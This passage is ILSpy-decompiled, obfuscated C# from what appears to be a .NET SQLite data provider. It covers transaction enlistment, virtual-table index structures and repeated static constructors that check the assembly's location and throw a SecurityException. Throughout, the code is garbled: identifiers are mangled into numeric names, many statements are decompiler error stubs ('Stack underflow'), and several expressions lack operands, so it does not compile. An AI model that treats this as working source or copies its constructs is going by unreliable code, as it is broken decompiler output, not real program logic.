				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, cultureInfo);
				return (string)/*Error near IL_0016: Stack underflow*/;
			}
		}

		internal static string MetaDataCollections
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0088_0007._007E_001E_0011;
				_ = ResourceManager;
				_0080._0014._0001(107398901);
				CultureInfo cultureInfo = _0001;
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, cultureInfo);
				return (string)/*Error near IL_0016: Stack underflow*/;
			}
		}

		internal _0019()
		{
		}
	}
}
namespace _001F
{
	internal sealed class _001A : IDisposable, IEnlistmentNotification
	{
		internal global::_0010._007F _0001;

		internal Transaction _0001;

		internal bool _0001;

		internal bool _0002;

		internal _001A(global::_0017._0080 _0002_0014_0006, Transaction _008A_0081_0006, System.Data.IsolationLevel _0082_0081_0006, bool _0083_0081_0006, bool _0084_0081_0006)
		{
			this._0001 = _0002_0014_0006._0001(global::_0011._0018._0001(_0082_0081_0006, _0084_0081_0006, this, _0002_0014_0006, _008A_0081_0006, _0083_0081_0006));
			this._0001 = _008A_0081_0006;
			this._0001.EnlistVolatile(this, EnlistmentOptions.None);
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_001A)/*Error near IL_001a: Stack underflow*/, true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0011._0018._0001((_001A)/*Error near IL_000f: Stack underflow*/, false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public void _0001(Enlistment _0002)
		{
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_0064: Stack underflow*/);
			global::_0017._0080 obj = ((_001A)/*Error near IL_000b: Stack underflow*/)._0001.Connection;
			obj._0001 = null;
			try
			{
				global::_0011._0018._0001(true, (global::_0003._0016)this._0001);
				this._0001.Connection._0011 = 1;
				global::_0008._007E_0083_0002(this._0001);
				global::_0008._007E_0084_0002(_0002);
			}
			finally
			{
				global::_0011._0018._0001(obj, this);
			}
		}

		void IEnlistmentNotification.Commit(Enlistment _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002);
		}

		public void _0002(Enlistment _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_001A)/*Error near IL_0019: Stack underflow*/);
			_ = global::_0008._007E_0084_0002;
			/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
		}

		void IEnlistmentNotification.InDoubt(Enlistment _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002(_0002);
		}

		public void _0001(PreparingEnlistment _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_001A)/*Error near IL_0033: Stack underflow*/);
			_ = 0;
			global::_0010._007F obj = ((_001A)/*Error near IL_000c: Stack underflow*/)._0001;
			if (!global::_0011._0018._0001((byte)/*Error near IL_0011: Stack underflow*/ != 0, (global::_0003._0016)obj))
			{
				global::_0008._007E_0086_0002(_0002);
			}
			else
			{
				global::_0008._007E_0087_0002(_0002);
			}
		}

		void IEnlistmentNotification.Prepare(PreparingEnlistment _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002);
		}

		public void _0003(Enlistment _0002)
		{
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0049: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_0046: Stack underflow*/);
			global::_0017._0080 obj = ((_001A)/*Error near IL_000b: Stack underflow*/)._0001.Connection;
			obj._0001 = null;
			try
			{
				global::_0008._007E_0088_0002(this._0001);
				global::_0008._007E_0084_0002(_0002);
			}
			finally
			{
				global::_0011._0018._0001(obj, this);
			}
		}

		void IEnlistmentNotification.Rollback(Enlistment _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0003(_0002);
		}

		static _001A()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0013
{
	internal interface _0019
	{
		_0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004, IntPtr _0005, ref IntPtr _0006, ref IntPtr _0007);

		_0080._0017 _0002(IntPtr _0002, IntPtr _0003, int _0004, IntPtr _0005, ref IntPtr _0006, ref IntPtr _0007);

		_0080._0017 _0001(IntPtr _0002, IntPtr _0003);

		_0080._0017 _0001(IntPtr _0002);

		_0080._0017 _0002(IntPtr _0002);

		_0080._0017 _0001(IntPtr _0002, ref IntPtr _0003);

		_0080._0017 _0003(IntPtr _0002);

		_0080._0017 _0001(IntPtr _0002, int _0003, IntPtr _0004, int _0005, IntPtr _0006);

		_0080._0017 _0004(IntPtr _0002);

		int _0001(IntPtr _0002);

		_0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004);

		_0080._0017 _0001(IntPtr _0002, ref long _0003);

		_0080._0017 _0001(IntPtr _0002, int _0003, IntPtr _0004, ref long _0005);

		_0080._0017 _0005(IntPtr _0002);

		_0080._0017 _0006(IntPtr _0002);

		_0080._0017 _0007(IntPtr _0002);

		_0080._0017 _0008(IntPtr _0002);

		int _0001(IntPtr _0002, int _0003, IntPtr _0004, ref global::_0019._001F _0005, ref IntPtr _0006);

		_0080._0017 _0002(IntPtr _0002, IntPtr _0003);

		_0080._0017 _0001(IntPtr _0002, int _0003);

		_0080._0017 _0002(IntPtr _0002, int _0003);

		_0080._0017 _0003(IntPtr _0002, int _0003);
	}
}
namespace _0010
{
	internal interface _0081
	{
		IntPtr NativeHandle { get; }
	}
}
namespace _0001
{
	internal sealed class _007F : global::_0010._0081
	{
		internal IntPtr _0001;

		public IntPtr NativeHandle => ((_007F)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _007F(IntPtr _0094_0081_0006)
		{
			_0001 = _0094_0081_0006;
		}
	}
}
namespace _001A
{
	internal sealed class _0018 : global::_0010._0081
	{
		internal IntPtr _0001;

		internal bool _0001;

		internal object _0001;

		public IntPtr NativeHandle => ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;

		public bool Persisted => ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;

		public object Value
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				if (!((_0018)/*Error near IL_0007: Stack underflow*/)._0001)
				{
					_0080._0014._0001(107375537);
					new InvalidOperationException((string?)/*Error near IL_0029: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				return _0001;
			}
		}

		internal _0018(IntPtr _009E_0081_0006)
		{
			this._0001 = _009E_0081_0006;
		}

		static _0018()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0019
{
	internal enum _0080 : byte
	{
		_0001 = 2,
		_0002 = 4,
		_0003 = 8,
		_0004 = 16,
		_0005 = 32,
		_0006 = 64,
		_0007 = 65,
		_0008 = 66,
		_000E = 67
	}
}
namespace _001A
{
	[Flags]
	internal enum _0019
	{
		_0001 = 0,
		_0002 = 1
	}
}
namespace _0003
{
	internal sealed class _0017
	{
		public int _0001;

		public _0019._0080 _0001;

		public byte _0001;

		public int _0002;

		internal _0017(global::_0017._0084._007F _0014_0081_0006)
			: this(_0014_0081_0006._0001, _0014_0081_0006._0001, _0014_0081_0006._0001, _0014_0081_0006._0002)
		{
		}

		private _0017(int _0003_0082_0006, _0019._0080 _0081_0016_0006, byte _0004_0082_0006, int _0005_0082_0006)
		{
			this._0001 = _0003_0082_0006;
			this._0001 = _0081_0016_0006;
			_0001 = _0004_0082_0006;
			_0002 = _0005_0082_0006;
		}
	}
	internal sealed class _0018
	{
		public int _0001;

		public byte _0001;

		internal _0018(global::_0017._0084._0080 _0016_0081_0006)
			: this(_0016_0081_0006._0001, _0016_0081_0006._0001)
		{
		}

		private _0018(int _0003_0082_0006, byte _0007_0082_0006)
		{
			this._0001 = _0003_0082_0006;
			_0001 = _0007_0082_0006;
		}

		static _0018()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0001
{
	internal sealed class _0080
	{
		public int _0001;

		public byte _0001;

		internal _0080()
		{
		}

		internal _0080(global::_0017._0084._0081 _0018_0081_0006)
			: this(_0018_0081_0006._0001, _0018_0081_0006._0001)
		{
		}

		private _0080(int _000E_0082_0006, byte _000F_0082_0006)
		{
			this._0001 = _000E_0082_0006;
			_0001 = _000F_0082_0006;
		}
	}
}
namespace _0002
{
	internal sealed class _001D
	{
		internal global::_0003._0017[] _0001;

		internal global::_0003._0018[] _0001;

		public global::_0003._0017[] Constraints => ((_001D)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0003._0018[] OrderBys => ((_001D)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _001D(int _0013_0082_0006, int _0014_0082_0006)
		{
			this._0001 = new global::_0003._0017[_0013_0082_0006];
			_0001 = new global::_0003._0018[_0014_0082_0006];
		}

		static _001D()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0016
{
	internal sealed class _001E
	{
		internal global::_0001._0080[] _0001;

		internal int _0001;

		internal string _0001;

		internal int _0002;

		internal int _0003;

		internal double? _0001;

		internal long? _0001;

		internal global::_001A._0019? _0001;

		internal long? _0002;

		public global::_0001._0080[] ConstraintUsages => ((_001E)/*Error near IL_0007: Stack underflow*/)._0001;

		public int IndexNumber
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string IndexString
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int NeedToFreeIndexString
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int OrderByConsumed
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public double? EstimatedCost
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0001 = (double?)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public long? EstimatedRows
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0001 = (long?)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_001A._0019? IndexFlags
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_001A._0019?)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public long? ColumnsUsed
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_001E)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_001E)/*Error near IL_0009: Stack underflow*/)._0002 = (long?)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal _001E(int _0013_0082_0006)
		{
			this._0001 = new global::_0001._0080[_0013_0082_0006];
			for (int i = 0; i < _0013_0082_0006; i++)
			{
				this._0001[i] = new global::_0001._0080();
			}
		}
	}
}
namespace _0014
{
	internal sealed class _0018
	{
		internal global::_0002._001D _0001;

		internal global::_0016._001E _0001;

		public global::_0002._001D Inputs => ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0016._001E Outputs => ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _0018(int _0013_0082_0006, int _0014_0082_0006)
		{
			this._0001 = new global::_0002._001D(_0013_0082_0006, _0014_0082_0006);
			_0001 = new global::_0016._001E(_0013_0082_0006);
		}

		static _0018()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0001
{
	internal sealed class _0081 : IDisposable, global::_0010._0081
	{
		private const int m__0001 = 0;

		private const int m__0002 = 1;

		private const int _0003 = 2;

		private string[] m__0001;

		private global::_0014._0018 m__0001;

		private IntPtr m__0001;

		internal bool _0001;

		public virtual string[] Arguments
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0081)/*Error near IL_0014: Stack underflow*/);
				return ((_0081)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
		}

		public virtual string ModuleName
		{
			get
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0081)/*Error near IL_0023: Stack underflow*/);
				string[] array = ((_0081)/*Error near IL_000b: Stack underflow*/).Arguments;
				if (array != null && array.Length > 0)
				{
					return array[0];
				}
				return null;
			}
		}

		public virtual string DatabaseName
		{
			get
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0081)/*Error near IL_0023: Stack underflow*/);
				string[] array = ((_0081)/*Error near IL_000b: Stack underflow*/).Arguments;
				if (array != null && array.Length > 1)
				{
					return array[1];
				}
				return null;
			}
		}

		public virtual string TableName
		{
			get
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0081)/*Error near IL_0023: Stack underflow*/);
				string[] array = ((_0081)/*Error near IL_000b: Stack underflow*/).Arguments;
				if (array != null && array.Length > 2)
				{
					return array[2];
				}
				return null;
			}
		}

		public virtual global::_0014._0018 Index
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0081)/*Error near IL_0014: Stack underflow*/);
				return ((_0081)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
		}

		public virtual IntPtr NativeHandle
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0081)/*Error near IL_0014: Stack underflow*/);
				return ((_0081)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0081)/*Error near IL_0009: Stack underflow*/).m__0001 = (IntPtr)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0081(string[] _0097_0082_0006)
		{
			this.m__0001 = _0097_0082_0006;
		}

		public virtual bool _0001(global::_0014._0018 _0002)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0081)/*Error near IL_0016: Stack underflow*/);
			((_0081)/*Error near IL_000c: Stack underflow*/).m__0001 = _0002;
			return true;
		}

		public virtual bool _0001(string _0002)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0081)/*Error near IL_002d: Stack underflow*/);
			if (((_0081)/*Error near IL_000b: Stack underflow*/).m__0001 != null && this.m__0001.Length > 2)
			{
				this.m__0001[2] = _0002;
				return true;
			}
			return false;
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0081)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if (!((_0081)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				((_0081)/*Error near IL_0011: Stack underflow*/)._0001 = true;
			}
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0081)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _0017
{
	internal class _0086 : IDisposable, global::_0010._0081
	{
		protected static readonly int _0001;

		private int m__0002;

		private global::_0001._0081 m__0001;

		private int _0003;

		private string m__0001;

		private global::_001A._0018[] m__0001;

		private IntPtr m__0001;

		internal bool _0001;

		public virtual global::_0001._0081 Table
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0086)/*Error near IL_0014: Stack underflow*/);
				return ((_0086)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
		}

		public virtual int IndexNumber
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0086)/*Error near IL_0014: Stack underflow*/);
				return ((_0086)/*Error near IL_000b: Stack underflow*/)._0003;
			}
		}

		public virtual string IndexString
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0086)/*Error near IL_0014: Stack underflow*/);
				return ((_0086)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
		}

		public virtual global::_001A._0018[] Values
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0086)/*Error near IL_0014: Stack underflow*/);
				return ((_0086)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
		}

		public virtual IntPtr NativeHandle
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001((_0086)/*Error near IL_0014: Stack underflow*/);
				return ((_0086)/*Error near IL_000b: Stack underflow*/).m__0001;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0086)/*Error near IL_0009: Stack underflow*/).m__0001 = (IntPtr)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0086(global::_0001._0081 _008E_0014_0006)
			: this()
		{
			this.m__0001 = _008E_0014_0006;
		}

		private _0086()
		{
			this.m__0002 = _0086._0001;
		}

		protected virtual int _0001(global::_001A._0018[] _0002)
		{
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			int num = 0;
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				global::_001A._0018[] array = (global::_001A._0018[])/*Error near IL_000a: Stack underflow*/;
				foreach (global::_001A._0018 obj in array)
				{
					if (obj != null && global::_0011._0018._0001(obj))
					{
						num++;
					}
				}
			}
			return num;
		}

		public virtual void _0001(int _0002, string _0003, global::_001A._0018[] _0004)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0086)/*Error near IL_0042: Stack underflow*/);
			if ((int)/*Error near IL_0008: Stack underflow*/ != 0 && _0001(_0004) != _0004.Length)
			{
				throw new SQLiteException(global::_0080._0014._0001(107375504));
			}
			this._0003 = _0002;
			this.m__0001 = _0003;
			this.m__0001 = _0004;
		}

		public virtual int _0002()
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0086)/*Error near IL_0007: Stack underflow*/).m__0002;
		}

		public virtual void _0002()
		{
			this.m__0002++;
		}

		public void Dispose()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0086)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if (!((_0086)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				((_0086)/*Error near IL_0011: Stack underflow*/)._0001 = true;
			}
		}

		~_0086()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0086)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0086()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal interface _001E
	{
		bool Declared { get; }

		string Name { get; }

		_0080._0017 _0001(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref global::_0001._0081 _0005, ref string _0006);

		_0080._0017 _0002(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref global::_0001._0081 _0005, ref string _0006);

		_0080._0017 _0001(global::_0001._0081 _0002, global::_0014._0018 _0003);

		_0080._0017 _0001(global::_0001._0081 _0002);

		_0080._0017 _0002(global::_0001._0081 _0002);

		_0080._0017 _0001(global::_0001._0081 _0002, ref global::_0017._0086 _0003);

		_0080._0017 _0001(global::_0017._0086 _0002);

		_0080._0017 _0001(global::_0017._0086 _0002, int _0003, string _0004, global::_001A._0018[] _0005);

		_0080._0017 _0002(global::_0017._0086 _0002);

		bool _0001(global::_0017._0086 _0002);

		_0080._0017 _0001(global::_0017._0086 _0002, global::_0001._007F _0003, int _0004);

		_0080._0017 _0001(global::_0017._0086 _0002, ref long _0003);

		_0080._0017 _0001(global::_0001._0081 _0002, global::_001A._0018[] _0003, ref long _0004);

		_0080._0017 _0003(global::_0001._0081 _0002);

		_0080._0017 _0004(global::_0001._0081 _0002);

		_0080._0017 _0005(global::_0001._0081 _0002);

		_0080._0017 _0006(global::_0001._0081 _0002);

		bool _0001(global::_0001._0081 _0002, int _0003, string _0004, ref global::_0012._0014 _0005, ref IntPtr _0006);

		_0080._0017 _0001(global::_0001._0081 _0002, string _0003);

		_0080._0017 _0001(global::_0001._0081 _0002, int _0003);

		_0080._0017 _0002(global::_0001._0081 _0002, int _0003);

		_0080._0017 _0003(global::_0001._0081 _0002, int _0003);
	}
}
namespace _0008
{
	internal static class _0013
	{
	}
}
namespace _001C
{
	internal static class _0018
	{
		internal static int _0001;

		internal static readonly Encoding _0001;

		static _0018()
		{
			//IL_00d2: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00d8: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0018._0001 = 1073741823;
			_0001 = _0082_0002._0088_0005();
		}
	}
}
namespace _0007
{
	internal static class _001F
	{
	}
}
namespace _0006
{
	internal static class _001C
	{
		static _001C()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
